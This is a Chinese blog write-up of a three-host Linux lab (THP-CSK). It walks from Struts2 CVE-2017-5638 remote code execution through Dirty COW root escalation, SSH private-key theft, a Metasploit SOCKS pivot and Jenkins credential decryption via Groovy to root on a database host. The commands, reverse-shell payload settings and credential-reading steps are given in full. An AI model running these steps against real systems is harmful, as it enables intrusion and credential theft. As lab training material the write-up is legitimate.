---
cover: /images/THP.png
title: THP-CSK 靶场 Linux 内网横向渗透全流程
categories:
  - 靶机渗透
tags:
  - 靶机渗透
  - 内网渗透
  - 横向移动
  - Jenkins
  - 提权
abbrlink: 5532e4a
date: 2026-03-24 12:00:00# 🛡️ THP-CSK 靶场 · Linux 内网横向渗透全流程

> **靶场编号：** #189 · **难度方向：** Web DMZ → 内网横向  
> **涉及技术：** Struts2 RCE · 内核提权 · SSH 密钥复用 · SOCKS 代理穿透 · Jenkins 凭据解密
>
> https://www.cnblogs.com/wrold/p/19748562

---

## 📋 靶场概述

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image1.png)

本次靶场共三台 Linux 主机，模拟一个典型的企业内网"站库分离"架构：

| 主机 IP | 角色 | 对外可达 |
|---|---|---|
| `172.16.250.10` | Web 服务器（入口机） | ✅ 可直接访问 |
| `172.16.250.30` | 内网 Web 应用 | ❌ 仅内网访问 |
| `172.16.250.50` | 数据库服务器 | ❌ 不出网 |

- 靶机账号密码：`hacker / changeme`
- 主要攻击路径：利用 `.10` 上的 Struts2 漏洞获取 Shell → 提权 → 横向移动到 `.30` 和 `.50`

### 🗺️ 整体攻击思路

```
外网入口(.10)  →  代码执行 / 提权  →  内网横向(.30)  →  数据库(.50)
```

---

## 📥 靶场文件下载

```
https://secplanet.sfo2.cdn.digitaloceanspaces.com/THP-csk-lab.zip
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image2.png)

---

## 🔧 环境搭建

**VMware 路径：** 编辑 → 虚拟网络编辑器 → 更改设置

修改子网 IP 为 `172.16.250.0`，类型保持"段内可通讯"即可，用来模拟内网隔离环境。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image3.png)

---

## 🔍 信息收集

打开三台虚拟主机，先扫一下存活主机：

```bash
nmap -sn 172.16.250.0/24
```

刚好三台，符合预期。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image4.png)

然后对这三台机器做全端口详细扫描：

```bash
nmap -A -p- 172.16.250.10 172.16.250.30 172.16.250.50
```

扫描结果汇总：

| IP | 开放端口 / 特点 |
|---|---|
| `172.16.250.10` | 22 (SSH)、80 (nginx + OpenCms)、8009 (AJP)、8080 (Tomcat 7) |
| `172.16.250.30` | 仅 22 (SSH) |
| `172.16.250.50` | 仅 22 (SSH) |

> 💡 很明显：**.10 是入口机，.30 / .50 是横向移动目标**，只有 SSH 对外，说明内网还有服务隐藏着。

---

## 🌐 Web 踩点

**访问 80 端口：**

```
http://172.16.250.10/
```

跑的是 OpenCms：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image5.png)

**访问 8080 端口：**

```
http://172.16.250.10:8080/
```

标准的 Tomcat 页面：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image6.png)

尝试在 Kali 上搜 OpenCms 的漏洞：

```bash
searchsploit opencms
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image7.png)

基本都是 XXE 文件读取，没什么直接 RCE 的利用，先搁置。

再跑一下目录：

```bash
dirsearch -u http://172.16.250.10/
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image8.png)

也没发现啥有用的。到这里其实有点没头绪，后来翻 WP 才知道有这么一个路径：

```
http://172.16.250.10/struts2-showcase/showcase.action
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image9.png)

这是 **Struts2 Showcase Demo**，官方演示程序，很多靶场都会装这个当入口。看到这个基本就知道该怎么打了。

---

## 💥 漏洞利用：Struts2 RCE（CVE-2017-5638）

打开 MSF，搜 Struts2：

```bash
msfconsole
search struts2
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image10.png)

选用模块：

```bash
use exploit/multi/http/struts2_content_type_ognl
```

> 📌 对应漏洞：**CVE-2017-5638**，通过 Content-Type 头注入 OGNL 表达式实现远程代码执行。

注意默认 payload 是 Windows 的：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image11.png)

目标是 Linux，要手动切换：

```bash
set payload linux/x86/meterpreter/reverse_tcp
set RHOSTS 172.16.250.10
set RPORT 80
show options
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image12.png)

配置没问题，直接打：

```bash
run
getuid
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image13.png)

✅ 成功拿到 `tomcat` 权限，下一步是提权到 root。

---

## ⬆️ 提权

先获取交互式 Shell：

```bash
shell
python -c 'import pty; pty.spawn("/bin/bash")'  #不行
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> ⚠️ 注意：这台机器没有 `python`，只有 `python3`。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image14.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image15.png)

或者用这个也行：

```bash
script -qc /bin/bash /dev/null
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image16.png)

方法很多，选一个能用的就行。

### 🔎 提权侦察

先找 SUID 文件：

```bash
find / -perm -u=s -type f 2>/dev/null
```

没啥能用的。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image17.png)

试一下 sudo：

```bash
sudo -l
```

需要密码，跳过。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image18.png)

查内核版本，看看有没有内核漏洞可以打：

```bash
uname -a
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image19.png)

---

### ❌ 尝试 overlayfs（失败）

```bash
searchsploit overlayfs
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image20.png)

复制利用代码：

```bash
searchsploit -m linux/local/37292.c
```

退回 MSF session，上传文件：

```bash
upload 37292.c /tmp/37292.c
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image21.png)

编译并执行：

```bash
gcc 37292.c -o exp
chmod 777 ./exp
./exp
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image22.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image23.png)

有警告但能编译。结果执行发现不适配当前内核环境，宣告失败。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image24.png)

---

### ❌ Metasploit overlayfs 模块（失败）

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image25.png)

> 📌 模块：`40688.rb`

```bash
use exploit/linux/local/overlayfs_priv_esc
background
set SESSION 1
run
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image26.png)

同样失败，这台机器的内核版本就是不吃这套。

---

### ❌ Dirty COW 40839（失败，机器崩了）

```bash
searchsploit dirty cow
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image27.png)

```bash
searchsploit -m linux/local/40839.c
sessions 1
upload 40839.c /tmp/
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image28.png)

```bash
shell
cd /tmp
gcc 40839.c -o cow -lcrypt -lpthread
chmod +x cow
./cow
```

输入密码 `123456` 后 `su firefart`……又崩了。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image29.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image30.png)

---

### ✅ Dirty COW 40616（成功！）

```bash
searchsploit -m linux/local/40616.c
upload 40616.c /tmp/
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
cd /tmp
gcc 40616.c -o cowroot -pthread
chmod +x cowroot
./cowroot
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image31.png)

🎉 成功提权！

执行完之后，建议立刻运行以下命令**保持利用稳定**，不然系统很容易随机崩掉：

```bash
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
echo 1 > /proc/sys/kernel/panic
echo 1 > /proc/sys/kernel/panic_on_oops
echo 1 > /proc/sys/kernel/panic_on_unrecovered_nmi
echo 1 > /proc/sys/kernel/panic_on_io_nmi
echo 1 > /proc/sys/kernel/panic_on_warn
```

> ⚠️ **千万别一次性全部复制粘贴执行！** 一条一条来，否则可能造成系统崩溃。

关于把自己主机干蓝屏这件事……（doge）

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image32.png)

---

## 🔎 内网信息收集

提权成功后，先看看网卡信息：

```bash
ifconfig
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image33.png)

只有一个网段，确认网络拓扑。

然后去翻一下应用配置文件，找数据库连接信息：

```bash
cat /opt/tomcat/webapps/kittens/WEB-INF/config/opencms.properties
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image34.png)

找到了关键信息：

```
# WEB站点
IP地址：172.16.250.10
端口号：80

# 数据库
IP地址：172.16.250.50
端口号：3306

# 站库分离
账号密码：store / WTWOIUEfjSLeij
```

> 📝 这就是典型的站库分离架构，Web 和数据库分别跑在不同机器上。

翻一下历史命令，找到SSH 连接记录：

```bash
cat ~/.bash_history
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image35.png)

发现有 SSH 连接记录，再去读一下密钥：

```bash
cat ~/.ssh/id_rsa
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image36.png)

复制 SSH 私钥到本地（保存为 `ssh.txt`），尝试免密登录 .30 机器：

```bash
ssh -i ssh.txt root@172.16.250.30
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image37.png)

✅ 成功登录 `.30` 机器！

---

## 🔀 横向移动到 .30（Jenkins）

进去之后发现有个用户叫 `jenkins`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image38.png)

合理怀疑这台机器跑了 Jenkins 服务。查一下本机监听的端口：

```bash
netstat -tlnp
```

> 参数说明：`-t` TCP / `-l` 监听中 / `-n` 数字显示 / `-p` 显示进程

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image39.png)

果然有 `8080` 端口在监听，但之前 nmap 外部扫描没扫到，说明**这个服务只对内网开放**。

直接从外部访问果然不行：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image40.png)

在 `.10` 机器上试试：

```bash
curl http://172.16.250.30:8080
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image41.png)

有响应！那就在 `.10` 建立 SOCKS 代理节点，把流量代理过去。

---

## 🧭 建立 SOCKS 代理穿透内网

退回 MSF session（**不要 `ctrl+c` 或 `exit`，会话会直接中断！** 用 `background`）：

```bash
background
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image42.png)

### 建立路由

```bash
use multi/manage/autoroute
set session 4
run
```

让流量通过 `.10` 机器走。

### 建立 SOCKS 代理

```bash
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run
```

确认模块运行状态：

```bash
jobs
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image43.png)

### 配置 proxychains

```bash
# /etc/proxychains4.conf
socks4 127.0.0.1 1080
```

> 尝试用 `proxychains firefox` 结果不好使，有限制，比较麻烦，直接改浏览器代理配置更省事。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image44.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image45.png)

可以正常访问了！

> 💡 **原理说明：** 流量走 `127.0.0.1:1080`，MSF 监听到数据后通过 `.10` 节点转发给 `.30` 机器，实现外部访问内网服务。

---

### 让自己的电脑也能用这个代理

如果想让本机（非 Kali）也通过这个节点访问内网，需要把监听地址从 `127.0.0.1` 改为 `0.0.0.0`（允许任意来源连接）：

```bash
jobs -k 0   # 先关掉之前那个

use auxiliary/server/socks_proxy
set SRVHOST 0.0.0.0   # 关键：允许任何机器连接你的 Kali
set SRVPORT 1080
set VERSION 4a
run
```

**方式一：浏览器插件（推荐）**

配置 SOCKS4 代理指向 Kali IP:1080，启动就能访问了。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image46.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image47.png)

**方式二：代理工具（Proxifier）**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image48.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image49.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image50.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image51.png)

结果测试半天浏览器就是不走流量，试了半天才知道是软件问题

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260321150416364.png)

> ⚠️ 注意：Proxifier **Portable Edition（非安装版）不注入系统驱动**，无法拦截任意进程的流量，Applications 写 `Any` 完全没用。所以这里用 Portable 版试了半天没反应，换回浏览器插件解决。

也可以直接用 curl 测试通路：

```bash
curl --socks4 172.16.250.128:1080 http://172.16.250.30:8080/
```

有正常回显，通信没问题。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260321150507432.png)

---

## 🔑 Jenkins 凭据窃取

继续访问 Jenkins：

```
http://172.16.250.30:8080/jenkins/
```

> 💡 直接访问 `8080` 是 Tomcat，Jenkins 路径是 `/jenkins/`，用proxchains dirsearch还把msf扫崩了，翻wp才知道路径是/jenkins/……

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image54.png)

点进去可以看到有两个凭据账户：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image55.png)

**第一个：root 账户**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image56.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image57.png)

就是之前从 `.10` 拿到的那个 SSH 私钥，对应 `.30` 的 root 登录。

**第二个：db_backup 账户**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image58.png)

密码前端是隐藏的，简单改改

发现一段加密字符串：

```
2M0vgELkx9OMFTP8UCoNNneTI7CVjBr9sKSCtKoUl08=
```

这是数据库用户（`.50` 机器）的密码，明显加密了，需要解密。

Jenkins 自带脚本控制台，可以直接解密：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image59.png)

```groovy
println hudson.util.Secret.decrypt("2M0vgELkx9OMFTP8UCoNNneTI7CVjBr9sKSCtKoUl08=")
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image60.png)

解密得到明文密码：

```
)uDvra{4UL^;r?*h
```

> 📌 Jenkins 使用 `hudson.util.Secret` 对凭据加密，密钥存储在 Jenkins 主目录的 `secret.key` 文件中，通过 Groovy 脚本可以直接在 Jenkins 内解密。这是 Jenkins 凭据审计中的常见利用点。

---

## 🎯 横向移动到 .50（数据库服务器）

拿到密码，可以直接 SSH 连接 `.50` 的数据库备份账户：

```bash
ssh db_backup@172.16.250.50
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image61.png)

看一下 sudo 权限：

```bash
sudo -l
```

惊喜，直接可以提权：

```bash
sudo su
```

✅ 成功获取 `.50` 数据库服务器的 root 权限！

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image62.png)

---

## 📊 完整攻击链回顾

```
[kali外网]
  │
  ▼
.10 (172.16.250.10)
  ├─ Struts2 CVE-2017-5638 → RCE (tomcat权限)
  ├─ DirtyCOW 40616 → root提权
  ├─ 读取 opencms.properties → 发现数据库IP(.50)
  └─ 读取 ~/.ssh/id_rsa → SSH私钥
  │
  ▼
.30 (172.16.250.30)
  ├─ SSH私钥免密登录 root
  ├─ Jenkins 8080 仅内网开放
  ├─ MSF autoroute + socks_proxy 穿透内网
  └─ Jenkins 脚本控制台解密凭据
  │
  ▼
.50 (172.16.250.50)
  ├─ db_backup + 解密密码 SSH登录
  └─ sudo su → root
```

---

## 💬 踩坑总结

这次靶场环境问题确实有点多，整理一下踩过的坑：

- 🐛 **浏览器经常崩**，没错自己的浏览器打不开，不知道什么问题
- 🐛 **MSF session 掉线**，msf的权限太容易掉了
- 🐛 **靶机不稳定**，Dirty COW 打了好几次才成功，40839 和 Metasploit 模块都失败了，最后 40616 才行
- 🐛 **Proxifier Portable 无效**，非安装版不注入驱动，`Any` 进程规则没用，直接改浏览器代理省事多了
- 🐛 **Jenkins 路径不直觉**，直接访问 8080 是 Tomcat，Jenkins 藏在 `/jenkins/` 下，没 WP 真不好找
- 🐛 **proxychains + dirsearch 把 MSF 扫崩了**……真的难崩（加参数-t）
- 🐛 **自己电脑还崩过一次**

蚌埠住了，但最后全打通了，还是值得的 🎉
